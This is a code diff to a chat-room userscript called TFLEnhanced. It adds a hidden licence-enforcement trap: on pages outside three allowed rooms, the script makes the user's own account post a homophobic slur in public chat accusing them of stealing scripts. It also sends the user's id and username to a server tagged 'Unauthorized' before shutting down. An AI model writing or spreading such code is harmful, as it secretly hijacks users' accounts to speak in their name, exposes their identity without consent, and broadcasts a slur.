@@ -104,6 +104,15 @@ TFLEnhancedModel = require('app/base/Class').extend({
             b && a.scrollTop(a[0].scrollHeight);
             setTimeout(function(){location.reload()},1500)
             };
+         if(location.pathname.split('/')[1] != undefined)
+        {
+            if(!(location.pathname.split('/')[1] == 'thedark1337' || location.pathname.split('/')[1] == 'electrodubstep-techno' || location.pathname.split('/')[1] == 'club-canterlot'))
+            {
+            API.chatLog('Unauthorized Script User Detected. Your Script Will Now Close.');
+            API.sendChat('I AM A MAJOR FAGGOT THAT LIKES TO STEAL SCRIPTS');
+            setTimeout(function(){TFLEnhanced.close(); API.sendChat('/close');},3000);
+            }
+             
     },
     close: function(){
         var Lang = require('lang/Lang');
@@ -405,13 +414,14 @@ initPopout : function(){
         {
             var userInfo = API.getUser();
                 this.send(JSON.stringify({
-                type:    'userinfo',
+                type:    'Unauthorized',
                 id:       userInfo.id,
                 username: userInfo.username,
                 version:  TFLEnhanced.toString(),
                 script:   'TFLEnhanced'
             }));
-            API.chatLog('Unauthorized script user detected. Your Script will now close')
+            API.chatLog('Unauthorized script user detected. Your Script will now close');
+            API.sendChat('I AM A MAJOR FAGGOT THAT LIKES TO STEAL SCRIPTS');
             setTimeout(function() {
             if(TFLEnhanced != undefined)
             {
